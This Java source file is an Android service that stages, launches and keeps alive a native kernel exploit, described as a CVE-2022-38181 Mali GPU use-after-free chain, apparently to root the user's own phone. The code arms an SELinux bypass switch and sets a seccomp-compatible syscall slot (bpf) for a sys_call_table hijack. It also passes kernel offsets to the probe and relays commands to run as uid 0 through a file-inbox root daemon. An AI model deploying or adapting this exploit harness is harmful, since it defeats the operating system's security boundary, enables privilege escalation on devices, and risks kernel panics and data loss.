package com.hlk.rootguard;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * Runs the Mali kbase probe (CVE-2022-38181 chain) and keeps it alive.
 *
 * The probe is a static aarch64 binary shipped as lib/arm64-v8a/libxprobe.so
 * so the installer extracts it.  It is copied into the code cache dir, made
 * executable, and started there -- executing straight out of nativeLibraryDir
 * works on some builds but not all (the installer often leaves 0644).
 *
 * Lifecycle rules that matter for safety:
 *   - never kill the probe.  Once phase C has written foreign descriptors
 *     into the GPU page tables, the process dying tears down the kbase
 *     context and the kernel panics.  "Disable" therefore only stops the
 *     *next* boot from starting it; the current one lives until reboot.
 *   - the "attempt" flag is set before fork/exec and cleared only after the
 *     probe reports a live root channel.  A boot that finds the flag still
 *     set means the previous run took the phone down, and MAX_FAILS of those
 *     turn auto-start off for good.
 */
public class GuardService extends Service {
    private static final String TAG = "HlkGuard";
    private static final String CH_ID = "guard";
    private static final int NOTIF_ID = 0x484c4b;

    public static final String ACTION_START = "com.hlk.rootguard.START";
    public static final String ACTION_DISABLE = "com.hlk.rootguard.DISABLE";
    public static final String ACTION_STATUS = "com.hlk.rootguard.STATUS";

    /** ring buffer for the UI; also mirrored to a file next to the APK data */
    private static final int RING = 400;
    private static final List<String> sLog = new ArrayList<>();
    private static volatile String sState = "idle";
    private static volatile int sPid = -1;
    private static volatile boolean sRoot = false;

    private Process proc;
    private Thread pump;

    static String state() {
        return sState;
    }

    static int pid() {
        return sPid;
    }

    static boolean root() {
        return sRoot;
    }

    static List<String> logTail(int n) {
        synchronized (sLog) {
            int from = Math.max(0, sLog.size() - n);
            return new ArrayList<>(sLog.subList(from, sLog.size()));
        }
    }

    static void note(String line) {
        Log.i(TAG, line);
        synchronized (sLog) {
            sLog.add(line);
            while (sLog.size() > RING)
                sLog.remove(0);
        }
    }

    /**
     * Drop the UI ring buffer only (used by the Log page's "清空日志" button).
     * The live probe keeps appending, so new output starts from a clean view.
     * logcat and the on-disk mirror are deliberately untouched.
     */
    static int clearLog() {
        synchronized (sLog) {
            int n = sLog.size();
            sLog.clear();
            return n;
        }
    }

    /** Allow exactly one launch of the chain, right now.  Every entry point
     *  that intends to run the probe has to call this first. */
    static void arm(Context c) {
        Prefs.sp(c).edit().putBoolean(Prefs.ARMED, true).commit();
    }

    @Override
    public IBinder onBind(Intent i) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm != null) {
            NotificationChannel ch = new NotificationChannel(CH_ID, "root guard",
                    NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            nm.createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String act = intent != null ? intent.getAction() : null;
        if (ACTION_DISABLE.equals(act)) {
            Prefs.setEnabled(this, false);
            note("autostart disabled by user (probe keeps running until reboot)");
            sState = "disabled";
            refreshNotification();
            return START_NOT_STICKY;
        }
        startForeground(NOTIF_ID, buildNotification());

        if (!Prefs.enabled(this)) {
            note("not enabled, nothing to do");
            sState = "disabled";
            stopSelf();
            return START_NOT_STICKY;
        }
        if (proc != null && proc.isAlive()) {
            note("already running pid=" + sPid);
            return START_NOT_STICKY;
        }
        if (killSwitchPresent()) {
            note("kill-switch file present, refusing to start");
            sState = "killswitch";
            stopSelf();
            return START_NOT_STICKY;
        }
        // A restart delivered by the framework must never fire the chain: only
        // an explicit arming (boot receiver / Start button / adb "run") may.
        if (!Prefs.sp(this).getBoolean(Prefs.ARMED, false)) {
            note("not armed, a service restart does not run the probe");
            sState = "idle";
            stopSelf();
            return START_NOT_STICKY;
        }
        sState = "starting";
        new Thread(this::boot, "guard-main").start();
        // START_NOT_STICKY on purpose: if this process is killed the framework
        // must not bring the service back behind the user's back.
        return START_NOT_STICKY;
    }

    /** A file next to the app data is the most reliable off switch: it works
     *  even when the UI cannot be opened or the device is in a bootloop. */
    private boolean killSwitchPresent() {
        File ext = getExternalFilesDir(null);
        return (ext != null && new File(ext, "DISABLE").exists())
                || new File("/sdcard/HLK_ROOT_OFF").exists();
    }

    private void boot() {
        boolean selftest = Prefs.sp(this).getBoolean("selftest", false);
        int delay = selftest ? 0 : Prefs.delayS(this);
        note("settle delay " + delay + "s (system must be idle before the UAF)");
        for (int i = 0; i < delay; i += 5) {
            if (!Prefs.enabled(this) || killSwitchPresent()) {
                note("cancelled during settle delay");
                sState = "disabled";
                stopSelf();
                return;
            }
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                return;
            }
        }
        try {
            runProbe();
        } catch (Throwable t) {
            note("probe launch threw: " + t);
            sState = "error";
        }
    }

    private File stage(File src, File dir) throws IOException {
        /* Keep the basename in sync with the probe's own comm fallback:
         * phase I walks task_struct.comm to find its own cred. */
        File dst = new File(dir, "jit_write_probe");
        try (InputStream in = new java.io.FileInputStream(src);
             OutputStream out = new FileOutputStream(dst)) {
            byte[] b = new byte[1 << 16];
            int n;
            while ((n = in.read(b)) > 0)
                out.write(b, 0, n);
        }
        //noinspection ResultOfMethodCallIgnored
        dst.setExecutable(true, false);
        //noinspection ResultOfMethodCallIgnored
        dst.setReadable(true, false);
        return dst;
    }

    /** v1.1: a native lib whose content was lost to a panic mid-extraction is
     *  indistinguishable from a good one by size alone, and on this EMUI
     *  build exec'ing garbage exits cleanly with rc=0 -- the probe then
     *  "exited rc=0 (no root)" with no output at all.  The APK itself is
     *  trusted (PackageManager verified its digest at install), so when the
     *  extracted lib is not a valid ELF we re-extract it from base.apk. */
    private static boolean isElf(File f) throws IOException {
        try (InputStream in = new java.io.FileInputStream(f)) {
            byte[] m = new byte[4];
            int n = in.read(m);
            return n == 4 && m[0] == 0x7f && m[1] == 'E' && m[2] == 'L'
                    && m[3] == 'F';
        }
    }

    private File extractProbeFromApk(File dst) throws IOException {
        String entry = "lib/arm64-v8a/libxprobe.so";
        try (java.util.zip.ZipFile z =
                     new java.util.zip.ZipFile(getApplicationInfo().sourceDir)) {
            java.util.zip.ZipEntry e = z.getEntry(entry);
            if (e == null)
                throw new IOException(entry + " missing in "
                        + getApplicationInfo().sourceDir);
            try (InputStream in = z.getInputStream(e);
                 OutputStream out = new FileOutputStream(dst)) {
                byte[] b = new byte[1 << 16];
                int n;
                while ((n = in.read(b)) > 0)
                    out.write(b, 0, n);
            }
        }
        //noinspection ResultOfMethodCallIgnored
        dst.setExecutable(true, false);
        //noinspection ResultOfMethodCallIgnored
        dst.setReadable(true, false);
        return dst;
    }

    private File resolveBinary() throws IOException {
        File libDir = new File(getApplicationInfo().nativeLibraryDir);
        File src = new File(libDir, "libxprobe.so");
        if (!src.exists())
            throw new IOException("libxprobe.so missing in " + libDir);
        // code cache is ours and writable; exec from here is allowed for
        // apps whose targetSdk is below 29
        File dst;
        if (isElf(src)) {
            dst = stage(src, getCodeCacheDir());
        } else {
            note("WARN: extracted lib is not a valid ELF, re-extracting "
                    + "from the APK");
            dst = extractProbeFromApk(new File(getCodeCacheDir(),
                    "jit_write_probe"));
        }
        if (!isElf(dst))
            throw new IOException("staged probe is not a valid ELF; "
                    + "refusing to exec garbage (rc=0 silent death)");
        if (!dst.canExecute())
            note("WARN: " + dst + " is not executable, exec will fail");
        return dst;
    }

    private void runProbe() throws IOException {
        File bin = resolveBinary();
        File ext = getExternalFilesDir(null);
        File logf = new File(ext != null ? ext : getFilesDir(), "probe.log");
        // The probe fsyncs every line into its own mirror.  Keep it a separate
        // file from the stdout capture: mark() writes to both fd 1 and the
        // mirror, so sharing one file would duplicate every line.  `probe.out`
        // is the copy that survives a panic before the pump can flush.
        File mirror = new File(ext != null ? ext : getFilesDir(), "probe.out");
        note("binary " + bin + " (" + bin.length() + " bytes)");
        note("log " + logf + " (mirror " + mirror + ")");
        // a run appends a few KB; keep the files from growing across boots
        for (File f : new File[]{logf, mirror}) {
            if (f.length() > (1 << 20)) {
                //noinspection ResultOfMethodCallIgnored
                f.delete();
            }
        }

        // The root channel (rootd.sh + rootsrv + r) ships as assets because the
        // app cannot write /data/local/tmp.  extractChannel() also returns the
        // directory that becomes the *inbox* for root commands: it is the only
        // place the UI may write, and after avc_denied() is neutralised the
        // root daemon can read it too.
        File chan = extractChannel();

        // Switch files the probe checks with access(2).  They live next to the
        // channel, never in /data/local/tmp: an unprivileged app cannot create
        // anything there, which is exactly why the probe grew the env override.
        File goFile = new File(chan, "v16_go");
        File avcFile = new File(chan, "v16_avc");
        note("avc bypass armed: " + touch(avcFile) + ", commit armed: " + touch(goFile));

        ProcessBuilder pb = new ProcessBuilder(bin.getAbsolutePath());
        pb.redirectErrorStream(true);
        pb.directory(getFilesDir());
        pb.environment().put("PROBE_LOG", mirror.getAbsolutePath());
        pb.environment().put("PROBE_CHANNEL_DIR", chan.getAbsolutePath());
        pb.environment().put("PROBE_GO_FILE", goFile.getAbsolutePath());
        pb.environment().put("PROBE_AVC_FILE", avcFile.getAbsolutePath());
        // The commit vehicle changes in an app domain.  A zygote child carries
        // a seccomp filter that cannot call any number in the arm64 hole
        // 244..259, and that hole does not intersect the app whitelist at all
        // (C-19), so the sys_call_table hijack has to use a *real*, rarely
        // used, whitelisted syscall instead.  bpf (148) is in the list and
        // bionic never calls it.
        //
        // The number is only a *first candidate*: the probe writes a harmless
        // pointer into it, reads the page back, and moves on to the next one
        // if the write never became visible - entries share 64-byte cache
        // lines with their neighbours, and a line that stays resident in the
        // CPUs' caches hides the store completely (C-27).
        // Readiness gate.  "time" = the probe waits until the hard upper
        // bound (400 s uptime by default since v0.8) and fires; "signal"
        // (deprecated, 0/4 on-device) waits for a flat MemAvailable/Cached
        // window instead.  Set via CtlReceiver cmd gate.
        pb.environment().put("PROBE_GATE_MODE",
                Prefs.sp(this).getString(Prefs.GATE_MODE, "time"));
        pb.environment().put("PROBE_SLOT", "148");
        // The 15 built-in offsets would be enough, but shipping the full table
        // lets phase E skip the 50 MB kernel-image dump and keeps this build
        // independent of anything adb may or may not have pushed.
        pb.environment().put("PROBE_KOFFS", new File(chan, "koffs.txt").getAbsolutePath());
        if (Prefs.sp(this).getBoolean("selftest", false))
            pb.environment().put("PROBE_SELFTEST", "1");

        // record the attempt *before* the process can take the phone down,
        // and consume the one-shot arming so a later restart cannot re-fire
        Prefs.sp(this).edit()
                .putBoolean(Prefs.ATTEMPT, true)
                .putBoolean(Prefs.ARMED, false)
                .putString(Prefs.LAST_STATE, "starting")
                .commit();

        proc = pb.start();
        sPid = pidOf(proc);
        sState = "running";
        Prefs.sp(this).edit().putInt(Prefs.LAST_PID, sPid).commit();
        note("probe started pid=" + sPid);
        refreshNotification();

        pump = new Thread(() -> pumpOutput(proc, logf), "guard-pump");
        pump.start();

        new Thread(() -> {
            int rc;
            try {
                rc = proc.waitFor();
            } catch (InterruptedException e) {
                return;
            }
            sState = "exited rc=" + rc;
            note("probe exited rc=" + rc + (sRoot ? "" : " (no root)"));
            Prefs.sp(GuardService.this).edit()
                    .putString(Prefs.LAST_STATE, sState).commit();
            refreshNotification();
        }, "guard-wait").start();
    }

    private static boolean touch(File f) {
        try {
            //noinspection ResultOfMethodCallIgnored
            f.getParentFile().mkdirs();
            if (!f.exists() && !f.createNewFile())
                return false;
            return true;
        } catch (IOException e) {
            return false;
        }
    }

    private static int pidOf(Process p) {
        try {
            // Process.pid() needs API 26; the device is 29, but stay safe
            return (int) Process.class.getMethod("pid").invoke(p);
        } catch (Throwable t) {
            return -1;
        }
    }

    /** Unpack the channel helpers from assets into files we can hand to the
     *  probe.  The directory is also the command inbox for the UI, so it is
     *  returned even when some assets are missing (a probe without a channel
     *  still proves root in the log). */
    private File extractChannel() {
        File dir = new File(getFilesDir(), "chan");
        //noinspection ResultOfMethodCallIgnored
        dir.mkdirs();
        String[] names = {"rootd.sh", "rootsrv", "r", "koffs.txt"};
        int ok = 0;
        for (String n : names) {
            File out = new File(dir, n);
            try (InputStream in = getAssets().open(n);
                 OutputStream os = new FileOutputStream(out)) {
                byte[] b = new byte[1 << 16];
                int r;
                while ((r = in.read(b)) > 0)
                    os.write(b, 0, r);
                //noinspection ResultOfMethodCallIgnored
                out.setExecutable(true, false);
                ok++;
            } catch (IOException e) {
                note("asset " + n + " missing: " + e.getMessage());
            }
        }
        note("channel dir " + dir + " (" + ok + "/4 assets)");
        return dir;
    }

    /** Directory shared with the root daemon: the UI writes `rootcmd` here and
     *  reads `rootout` back.  Only meaningful once the probe reported root. */
    static File inbox(Context c) {
        return new File(c.getFilesDir(), "chan");
    }

    /**
     * Run one command as uid 0 through the root daemon and return its output.
     *
     * The daemon polls the inbox once a second, so a request is published with
     * an atomic rename and carries a unique completion token: a command the
     * daemon skipped (rename raced its mv) simply times out and is retried.
     *
     * @return the command output, or null when the daemon did not answer
     */
    static String runAsRoot(Context c, String cmd, int timeoutMs) {
        File dir = inbox(c);
        if (!dir.isDirectory())
            return null;
        for (int attempt = 0; attempt < 2; attempt++) {
            String tok = "RG" + android.os.Process.myPid() + "-" + attempt
                    + "-" + System.currentTimeMillis();
            File out = new File(dir, "rootout");
            File tmp = new File(dir, "rootcmd.tmp");
            File dst = new File(dir, "rootcmd");
            try {
                //noinspection ResultOfMethodCallIgnored
                out.delete();
                //noinspection ResultOfMethodCallIgnored
                new File(dir, "rootcmd.done").delete();
                try (OutputStream os = new FileOutputStream(tmp)) {
                    os.write((cmd + "\necho __DONE_" + tok + "\n").getBytes());
                }
                if (!tmp.renameTo(dst))
                    continue;
            } catch (IOException e) {
                return null;
            }
            long deadline = SystemClock.elapsedRealtime() + timeoutMs;
            while (SystemClock.elapsedRealtime() < deadline) {
                String text = readAll(out);
                if (text != null && text.contains("__DONE_" + tok)) {
                    StringBuilder sb = new StringBuilder();
                    for (String line : text.split("\n")) {
                        if (line.startsWith("__DONE_") || line.matches("rc=\\d+"))
                            continue;
                        sb.append(line).append('\n');
                    }
                    return sb.toString();
                }
                try {
                    Thread.sleep(120);
                } catch (InterruptedException e) {
                    return null;
                }
            }
        }
        return null;
    }

    private static String readAll(File f) {
        if (!f.isFile())
            return null;
        try (InputStream in = new java.io.FileInputStream(f)) {
            byte[] b = new byte[(int) Math.min(f.length(), 1 << 16)];
            int n = in.read(b);
            return n > 0 ? new String(b, 0, n) : null;
        } catch (IOException e) {
            return null;
        }
    }

    /** Read the probe's stdout and append it to a file, syncing every line so
     *  a kernel panic cannot swallow the last thing we saw. */
    private void pumpOutput(Process p, File logf) {
        try (BufferedReader r = new BufferedReader(
                new InputStreamReader(p.getInputStream()))) {
            FileOutputStream out = new FileOutputStream(logf, true);
            String line;
            while ((line = r.readLine()) != null) {
                note(line);
                out.write((line + "\n").getBytes());
                out.flush();
                out.getFD().sync();
                // Process.pid() is not on this API level, so take the real pid
                // from the probe's own banner instead of showing -1.
                if (sPid < 0 && line.contains("phase C ===")) {
                    int at = line.indexOf("pid=");
                    if (at > 0) {
                        try {
                            sPid = Integer.parseInt(
                                    line.substring(at + 4).trim());
                        } catch (NumberFormatException ignored) {
                        }
                    }
                }
                if (line.contains("PHASE_I OK") || line.contains("keepalive:")) {
                    boolean firstRoot = line.contains("PHASE_I OK") && !sRoot;
                    sRoot = line.contains("PHASE_I OK") || sRoot;
                    // Second stage: stage the SukiSU shim and load it.  This
                    // only spawns a thread -- the stdout pump must never block.
                    if (firstRoot)
                        KsuBootstrap.onRoot(this);
                    Prefs.sp(this).edit()
                            .putBoolean(Prefs.ATTEMPT, false)
                            .putInt(Prefs.FAILS, 0)
                            .putString(Prefs.LAST_STATE,
                                    sRoot ? "root" : "keepalive")
                            .commit();
                    sState = sRoot ? "root" : "keepalive";
                    refreshNotification();
                }
            }
            out.close();
        } catch (Throwable t) {
            note("pump stopped: " + t);
        }
    }

    private Notification buildNotification() {
        Intent open = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, open,
                PendingIntent.FLAG_UPDATE_CURRENT);

        Intent off = new Intent(this, GuardService.class)
                .setAction(ACTION_DISABLE);
        PendingIntent pOff = PendingIntent.getService(this, 1, off,
                PendingIntent.FLAG_UPDATE_CURRENT);

        String title = sRoot ? "root active (uid 0)" : "root guard: " + sState;
        return new Notification.Builder(this, CH_ID)
                .setContentTitle(title)
                .setContentText("pid " + sPid + " - tap to open")
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .setOngoing(true)
                .setContentIntent(pi)
                .addAction(new Notification.Action.Builder(null,
                        "Disable autostart", pOff).build())
                .build();
    }

    private void refreshNotification() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm != null)
            nm.notify(NOTIF_ID, buildNotification());
    }

    @Override
    public void onDestroy() {
        note("service destroyed" + (proc != null && proc.isAlive()
                ? " (probe still alive, left running on purpose)" : ""));
        super.onDestroy();
    }
}
